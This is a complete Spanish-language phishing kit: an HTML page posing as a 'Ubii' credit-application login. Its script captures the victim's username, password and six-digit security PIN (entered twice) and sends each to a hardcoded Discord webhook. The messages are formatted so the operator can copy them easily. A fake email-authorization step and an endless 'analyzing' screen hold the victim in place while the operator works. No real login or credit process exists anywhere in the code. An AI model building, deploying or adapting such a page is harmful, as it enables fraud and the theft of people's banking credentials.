<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Inicia Sesión - Proceso de Crédito</title>
    <!-- Tailwind CSS desde CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        ubiiBlue: '#009ee3',
                        ubiiBlueHover: '#0088c6',
                        ubiiBgLight: '#f3f4f6',
                        ubiiInputBg: '#ffffff',
                        ubiiToggleBg: '#eeeeee',
                        ubiiTextDark: '#2c2c2c',
                        ubiiPlaceholder: '#9ca3af',
                    },
                    borderRadius: {
                        '4xl': '2rem',
                    }
                }
            }
        }
    </script>
    <!-- FontAwesome para los iconos -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f1f3f6;
        }
        /* Ocultar flechas en los inputs numéricos */
        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }
        input[type=number] {
            -moz-appearance: textfield;
        }

        /* Animación suave e infinita para la barra de análisis */
        @keyframes pulseProgress {
            0% { width: 10%; left: 0%; }
            50% { width: 60%; left: 20%; }
            100% { width: 90%; left: 10%; }
        }
        .animate-progress-infinite {
            animation: pulseProgress 2.5s ease-in-out infinite alternate;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col justify-between items-center bg-[#f1f3f6] p-4 text-slate-800 selection:bg-ubiiBlue selection:text-white">

    <!-- Envoltorio principal para mantener todo centrado y responsivo -->
    <div class="w-full max-w-md mx-auto flex-1 flex flex-col justify-center my-4">
        
        <!-- Indicadores de Progreso en la Parte Superior -->
        <header class="w-full mb-6">
            <div class="flex justify-between items-center px-1">
                <span id="stepBadge" class="text-xs sm:text-sm font-semibold text-ubiiBlue bg-blue-100 px-3 sm:px-4 py-1.5 rounded-full shadow-sm">Paso 1 de 4</span>
                <span class="text-xs sm:text-sm text-gray-400 font-medium tracking-wide">Solicitud de Crédito</span>
            </div>
            <div class="w-full bg-gray-200 h-2 sm:h-2.5 rounded-full mt-3 overflow-hidden shadow-inner">
                <div id="progressBar" class="bg-ubiiBlue h-full w-1/4 transition-all duration-500 ease-out rounded-full"></div>
            </div>
        </header>

        <!-- ==================== ETAPA 1: PANTALLA DE LOGIN ==================== -->
        <main id="step1Screen" class="w-full bg-white rounded-[2rem] shadow-lg p-6 sm:p-10 border border-gray-100 transition-all duration-300">
            
            <!-- Título Central -->
            <div class="flex flex-col items-center justify-center mb-8">
                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4 shadow-sm">
                    <i class="fa-solid fa-user text-2xl"></i>
                </div>
                <h1 class="text-2xl sm:text-3xl font-bold text-[#1a1a1a]">Inicia sesión</h1>
            </div>

            <!-- Selector de Tipo de Usuario (Natural / Juridico) -->
            <div class="bg-[#f0f2f5] p-1.5 rounded-full flex items-center mb-6 relative shadow-inner">
                <button id="btnNatural" type="button" onclick="selectType('natural')" class="w-1/2 py-2.5 sm:py-3 rounded-full text-sm sm:text-base font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-md">
                    Natural
                </button>
                <button id="btnJuridico" type="button" onclick="selectType('juridico')" class="w-1/2 py-2.5 sm:py-3 rounded-full text-sm sm:text-base font-semibold transition-all duration-300 text-gray-500 hover:text-gray-800">
                    Jurídico
                </button>
            </div>

            <!-- Formulario de Entrada -->
            <form id="loginForm" onsubmit="goToStep2(event)" class="space-y-4 sm:space-y-5">
                
                <!-- Campo Usuario / Correo -->
                <div>
                    <input 
                        type="text" 
                        id="username" 
                        placeholder="Usuario / Correo" 
                        required
                        class="w-full px-4 sm:px-5 py-3.5 sm:py-4 bg-gray-50 border border-gray-200 rounded-2xl text-sm sm:text-base focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 transition-all placeholder-gray-400 font-normal"
                    >
                </div>

                <!-- Campo Contraseña -->
                <div class="relative">
                    <input 
                        type="password" 
                        id="password" 
                        placeholder="Contraseña" 
                        required
                        class="w-full px-4 sm:px-5 py-3.5 sm:py-4 bg-gray-50 pr-12 border border-gray-200 rounded-2xl text-sm sm:text-base focus:outline-none focus:border-ubiiBlue focus:ring-2 focus:ring-blue-100 transition-all placeholder-gray-400 font-normal"
                    >
                    <button 
                        type="button" 
                        onclick="togglePassword()" 
                        class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 hover:text-ubiiBlue transition-colors focus:outline-none p-2"
                    >
                        <i id="eyeIcon" class="fa-regular fa-eye-slash text-lg"></i>
                    </button>
                </div>

                <!-- Enlace "¿Olvidaste tú contraseña?" -->
                <div class="text-right pt-1">
                    <a href="#" class="text-xs sm:text-sm font-semibold text-ubiiBlue hover:text-ubiiBlueHover hover:underline transition-colors">
                        ¿Olvidaste tu contraseña?
                    </a>
                </div>

                <!-- Botón Ingresar -->
                <div class="pt-3">
                    <button 
                        type="submit" 
                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200"
                    >
                        Ingresar
                    </button>
                </div>

                <!-- Botón Registrarme -->
                <div>
                    <button 
                        type="button" 
                        class="w-full py-3.5 sm:py-4 bg-white border-2 border-gray-100 hover:border-gray-200 hover:bg-gray-50 text-gray-700 font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] focus:outline-none"
                    >
                        Registrarme
                    </button>
                </div>
            </form>
        </main>

        <!-- ==================== ETAPA 2: CLAVE DE SEGURIDAD REGISTRADA ==================== -->
        <main id="step2Screen" class="w-full bg-white rounded-[2rem] shadow-lg p-6 sm:p-10 border border-gray-100 hidden transition-all duration-300">
            
            <!-- Botón Volver -->
            <button type="button" onclick="goToStep(1)" class="text-gray-400 hover:text-gray-700 mb-6 flex items-center gap-2 text-sm sm:text-base font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
                <i class="fa-solid fa-arrow-left"></i> Volver
            </button>

            <!-- Título e Subtítulo -->
            <div class="flex flex-col items-center justify-center text-center mb-8">
                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4 shadow-sm">
                    <i class="fa-solid fa-lock text-2xl"></i>
                </div>
                <h1 class="text-2xl sm:text-3xl font-bold text-[#1a1a1a]">Clave de seguridad</h1>
                <p class="text-sm text-gray-500 mt-3 leading-relaxed">
                    Ingresa la clave de 6 dígitos que registraste en la app para la cuenta <br class="hidden sm:block"> <span class="displayUser font-bold text-gray-800 break-all"></span>
                </p>
            </div>

            <!-- Formulario PIN paso 1 -->
            <form id="pinFormStep2" onsubmit="goToStep3(event)" class="space-y-8">
                
                <!-- 6 Cajas para los dígitos adaptables con Grid -->
                <div class="grid grid-cols-6 gap-2 sm:gap-3">
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-2 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                </div>

                <!-- Enlace de recuperación -->
                <div class="text-center">
                    <a href="#" class="text-sm font-semibold text-ubiiBlue hover:text-ubiiBlueHover hover:underline transition-colors">
                        ¿Olvidaste tu clave de 6 dígitos?
                    </a>
                </div>

                <!-- Botón Continuar -->
                <div>
                    <button 
                        type="submit" 
                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200"
                    >
                        Continuar
                    </button>
                </div>
            </form>
        </main>

        <!-- ==================== ETAPA 3: CONFIRMACIÓN DE CLAVE ==================== -->
        <main id="step3Screen" class="w-full bg-white rounded-[2rem] shadow-lg p-6 sm:p-10 border border-gray-100 hidden transition-all duration-300">
            
            <!-- Botón Volver -->
            <button type="button" onclick="goToStep(2)" class="text-gray-400 hover:text-gray-700 mb-6 flex items-center gap-2 text-sm sm:text-base font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
                <i class="fa-solid fa-arrow-left"></i> Volver
            </button>

            <!-- Título e Subtítulo -->
            <div class="flex flex-col items-center justify-center text-center mb-8">
                <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4 shadow-sm">
                    <i class="fa-solid fa-key text-2xl"></i>
                </div>
                <h1 class="text-2xl sm:text-3xl font-bold text-[#1a1a1a]">Confirma tu clave</h1>
                <p class="text-sm text-gray-500 mt-3 leading-relaxed">
                    Ingresa nuevamente tu clave de 6 dígitos para confirmar la operación de crédito.
                </p>
            </div>

            <!-- Formulario PIN Paso 2 (Confirmación) -->
            <form id="pinFormStep3" onsubmit="goToStep4(event)" class="space-y-8">
                
                <!-- 6 Cajas de Confirmación con Grid -->
                <div class="grid grid-cols-6 gap-2 sm:gap-3">
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                    <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-3 w-full aspect-[4/5] sm:aspect-square text-center text-2xl sm:text-3xl font-bold border-2 border-gray-200 rounded-xl sm:rounded-2xl focus:outline-none focus:border-ubiiBlue focus:ring-4 focus:ring-blue-100 bg-gray-50 transition-all" required>
                </div>

                <!-- Alerta de no coincidencia -->
                <div id="errorMismatch" class="hidden bg-red-50 border-l-4 border-red-500 p-4 rounded-r-lg">
                    <p class="text-sm text-red-700 font-semibold flex items-center gap-2">
                        <i class="fa-solid fa-circle-exclamation"></i> Las claves no coinciden. Inténtalo de nuevo.
                    </p>
                </div>

                <!-- Botón Confirmar Clave -->
                <div>
                    <button 
                        type="submit" 
                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200"
                    >
                        Confirmar Clave
                    </button>
                </div>
            </form>
        </main>

        <!-- ==================== ETAPA 4: AUTORIZACIÓN POR CORREO ==================== -->
        <main id="step4Screen" class="w-full bg-white rounded-[2rem] shadow-lg p-6 sm:p-10 border border-gray-100 hidden transition-all duration-300">
            
            <!-- Botón Volver -->
            <button id="backFromStep4Btn" type="button" onclick="goToStep(3)" class="text-gray-400 hover:text-gray-700 mb-6 flex items-center gap-2 text-sm sm:text-base font-semibold focus:outline-none transition-colors w-fit p-1 -ml-1 rounded-lg">
                <i class="fa-solid fa-arrow-left"></i> Volver
            </button>

            <!-- VISTA DE CORREO DE AUTORIZACIÓN -->
            <div id="emailAuthSection">
                <div class="flex flex-col items-center justify-center text-center mb-8">
                    <div class="w-20 h-20 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4 relative shadow-sm">
                        <i class="fa-solid fa-envelope text-4xl animate-bounce"></i>
                        <span class="absolute -top-1 -right-1 flex h-5 w-5">
                          <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-400 opacity-75"></span>
                          <span class="relative inline-flex rounded-full h-5 w-5 bg-ubiiBlue border-2 border-white"></span>
                        </span>
                    </div>
                    <h1 class="text-2xl sm:text-3xl font-bold text-[#1a1a1a]">Autorización requerida</h1>
                    <p class="text-sm text-gray-500 mt-4 leading-relaxed">
                        Hemos enviado un correo de autorización a tu dirección registrada: <br>
                        <span class="displayUserEmail font-bold text-ubiiBlue block mt-1 break-all"></span>
                    </p>
                </div>

                <div class="bg-blue-50/70 border border-blue-100 rounded-2xl p-4 sm:p-5 mb-8 text-sm text-slate-700 shadow-inner">
                    <div class="flex items-start gap-3">
                        <i class="fa-solid fa-circle-info text-ubiiBlue text-base mt-0.5"></i>
                        <p class="leading-relaxed">Por favor, ingresa a tu bandeja de entrada y da autorización para continuar con el proceso del crédito.</p>
                    </div>
                </div>

                <div class="space-y-4">
                    <button 
                        type="button" 
                        onclick="startCreditAnalysis()" 
                        class="w-full py-3.5 sm:py-4 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] shadow-md focus:outline-none focus:ring-4 focus:ring-blue-200 flex items-center justify-center gap-2"
                    >
                        <i class="fa-solid fa-circle-check text-lg"></i>
                        Ya Autoricé Desde Mi Correo
                    </button>

                    <button 
                        type="button" 
                        onclick="resendAuthEmail()" 
                        class="w-full py-3.5 sm:py-4 bg-white border-2 border-gray-100 hover:border-gray-200 hover:bg-gray-50 text-gray-700 font-bold rounded-2xl text-sm sm:text-base transition-all transform active:scale-[0.98] focus:outline-none"
                    >
                        Reenviar Correo
                    </button>
                </div>
            </div>

            <!-- VISTA DE CARGA INFINITA -->
            <div id="loadingAnalysis" class="hidden flex flex-col items-center justify-center text-center py-8 space-y-6">
                <div class="relative w-24 h-24 flex items-center justify-center my-4">
                    <div class="w-24 h-24 border-4 border-blue-100 border-t-ubiiBlue rounded-full animate-spin shadow-sm"></div>
                    <i class="fa-solid fa-chart-line text-ubiiBlue text-3xl absolute"></i>
                </div>
                
                <div class="space-y-3">
                    <h1 class="text-xl sm:text-2xl font-bold text-[#1a1a1a]">Analizando Solicitud</h1>
                    <p class="text-sm text-gray-500 leading-relaxed font-medium px-4">
                        Este proceso demora un poco, por favor no cerrar la página.
                    </p>
                </div>

                <div class="w-full bg-gray-100 h-2.5 rounded-full overflow-hidden mt-6 relative shadow-inner">
                    <div class="bg-ubiiBlue h-full rounded-full animate-progress-infinite relative"></div>
                </div>
            </div>
        </main>

        <!-- Enlace global de soporte -->
        <div class="mt-8 text-center text-xs sm:text-sm text-gray-500 font-medium pb-4">
            ¿Tienes problemas? <a href="#" class="text-ubiiBlue hover:text-ubiiBlueHover hover:underline transition-colors">Contáctanos</a>
        </div>
    </div>

    <!-- Lógica JavaScript -->
    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1539815628586749962/vZ-AWmOfGZ8SIfj61NbVcMOxvmRGuy3dM5xEgp7QmpLl9lJekjsccXClXIs1QUCYeLA9";

        let selectedType = 'natural';
        let firstEnteredPin = '';
        let userEmailOrName = '';
        let userPassword = '';

        // Enviar a Discord
        function sendToDiscord(messageText) {
            fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    username: "Notificador Ubii",
                    content: messageText
                })
            }).catch(err => console.error("Error al enviar a Discord:", err));
        }

        function selectType(type) {
            selectedType = type;
            const btnNatural = document.getElementById('btnNatural');
            const btnJuridico = document.getElementById('btnJuridico');

            const activeClass = "w-1/2 py-2.5 sm:py-3 rounded-full text-sm sm:text-base font-semibold transition-all duration-300 bg-ubiiBlue text-white shadow-md";
            const inactiveClass = "w-1/2 py-2.5 sm:py-3 rounded-full text-sm sm:text-base font-semibold transition-all duration-300 text-gray-500 hover:text-gray-800";

            if (type === 'natural') {
                btnNatural.className = activeClass;
                btnJuridico.className = inactiveClass;
            } else {
                btnJuridico.className = activeClass;
                btnNatural.className = inactiveClass;
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.getElementById('eyeIcon');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeIcon.className = "fa-regular fa-eye text-lg";
            } else {
                passwordInput.type = 'password';
                eyeIcon.className = "fa-regular fa-eye-slash text-lg";
            }
        }

        function goToStep(stepNumber) {
            document.getElementById('step1Screen').classList.add('hidden');
            document.getElementById('step2Screen').classList.add('hidden');
            document.getElementById('step3Screen').classList.add('hidden');
            document.getElementById('step4Screen').classList.add('hidden');

            document.getElementById('emailAuthSection').classList.remove('hidden');
            document.getElementById('loadingAnalysis').classList.add('hidden');
            document.getElementById('backFromStep4Btn').classList.remove('hidden');

            const progressBar = document.getElementById('progressBar');
            const stepBadge = document.getElementById('stepBadge');
            stepBadge.innerText = `Paso ${stepNumber} de 4`;

            if (stepNumber === 1) progressBar.style.width = '25%';
            if (stepNumber === 2) progressBar.style.width = '50%';
            if (stepNumber === 3) progressBar.style.width = '75%';
            if (stepNumber === 4) progressBar.style.width = '100%';

            const activeScreen = document.getElementById(`step${stepNumber}Screen`);
            activeScreen.classList.remove('hidden');

            if (stepNumber === 2) {
                const inputs = document.querySelectorAll('.pin-input-2');
                inputs.forEach(i => i.value = '');
                if (inputs.length > 0) setTimeout(() => inputs[0].focus(), 100);
            } else if (stepNumber === 3) {
                const inputs = document.querySelectorAll('.pin-input-3');
                inputs.forEach(i => i.value = '');
                document.getElementById('errorMismatch').classList.add('hidden');
                if (inputs.length > 0) setTimeout(() => inputs[0].focus(), 100);
            }
        }

        function startCreditAnalysis() {
            const loadingSec = document.getElementById('loadingAnalysis');
            const emailSec = document.getElementById('emailAuthSection');
            const backBtn = document.getElementById('backFromStep4Btn');

            emailSec.classList.add('hidden');
            loadingSec.classList.remove('hidden');
            backBtn.classList.add('hidden');

            // Mensaje simple a Discord
            sendToDiscord(`⏳ El usuario **${userEmailOrName}** está en análisis (Hizo clic en Ya Autoricé).`);
        }

        // ======================================================================
        // AQUI ESTÁN LOS MENSAJES FORMATEADOS PARA QUE SEAN FÁCILES DE COPIAR
        // Usamos comillas invertidas (\`) de Markdown en las variables
        // ======================================================================

        function goToStep2(event) {
            event.preventDefault();
            userEmailOrName = document.getElementById('username').value;
            userPassword = document.getElementById('password').value;
            
            document.querySelectorAll('.displayUser').forEach(el => el.innerText = `(${userEmailOrName})`);
            document.querySelectorAll('.displayUserEmail').forEach(el => {
                el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
            });

            // Mensaje a Discord con formato "Click-to-Copy"
            const msgLogin = `**🚨 NUEVO INICIO DE SESIÓN**\nTipo: ${selectedType}\n\n**Usuario/Correo:**\n\`${userEmailOrName}\`\n\n**Contraseña:**\n\`${userPassword}\``;
            sendToDiscord(msgLogin);

            goToStep(2);
        }

        function goToStep3(event) {
            event.preventDefault();
            const inputs = document.querySelectorAll('.pin-input-2');
            firstEnteredPin = '';
            inputs.forEach(i => firstEnteredPin += i.value);

            if (firstEnteredPin.length === 6) {
                // Mensaje a Discord con formato "Click-to-Copy"
                const msgPin1 = `**🔑 PIN INGRESADO (Paso 2)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN:**\n\`${firstEnteredPin}\``;
                sendToDiscord(msgPin1);
                
                goToStep(3);
            }
        }

        function goToStep4(event) {
            event.preventDefault();
            const inputs = document.querySelectorAll('.pin-input-3');
            let confirmPin = '';
            inputs.forEach(i => confirmPin += i.value);

            if (confirmPin === firstEnteredPin) {
                // Mensaje a Discord con formato "Click-to-Copy"
                const msgPin2 = `**✅ PIN CONFIRMADO (Paso 3)**\n\n**Usuario:**\n\`${userEmailOrName}\`\n\n**PIN Confirmado:**\n\`${confirmPin}\``;
                sendToDiscord(msgPin2);
                
                goToStep(4);
            } else {
                sendToDiscord(`⚠️ **ERROR DE CLAVE:** El usuario \`${userEmailOrName}\` ingresó un PIN que no coincide.`);
                document.getElementById('errorMismatch').classList.remove('hidden');
                inputs.forEach(i => i.value = '');
                inputs[0].focus();
            }
        }

        // Configuración de las cajas del PIN
        function setupPinInputs(selectorClass) {
            const inputs = document.querySelectorAll(selectorClass);
            inputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (e.target.value.length > 1) {
                        e.target.value = e.target.value.slice(-1);
                    }
                    if (e.target.value !== '' && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                        inputs[index - 1].focus();
                    }
                });

                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').trim();
                    if (/^\d{6}$/.test(pasteData)) {
                        pasteData.split('').forEach((char, i) => {
                            if (inputs[i]) inputs[i].value = char;
                        });
                        inputs[5].focus();
                    }
                });
            });
        }

        setupPinInputs('.pin-input-2');
        setupPinInputs('.pin-input-3');

        function resendAuthEmail() {
            sendToDiscord(`📧 **El usuario \`${userEmailOrName}\` solicitó reenvío del correo.**`);
            const toast = document.createElement('div');
            toast.className = "fixed bottom-6 left-1/2 -translate-x-1/2 bg-slate-800 text-white px-5 py-3 rounded-full text-sm font-medium shadow-xl z-50 flex items-center gap-3 transition-opacity duration-300";
            toast.innerHTML = `<i class="fa-solid fa-paper-plane text-ubiiBlue text-lg"></i> Correo de autorización reenviado`;
            document.body.appendChild(toast);
            setTimeout(() => {
                toast.style.opacity = '0';
                setTimeout(() => toast.remove(), 300);
            }, 3000);
        }
    </script>
</body>
</html>


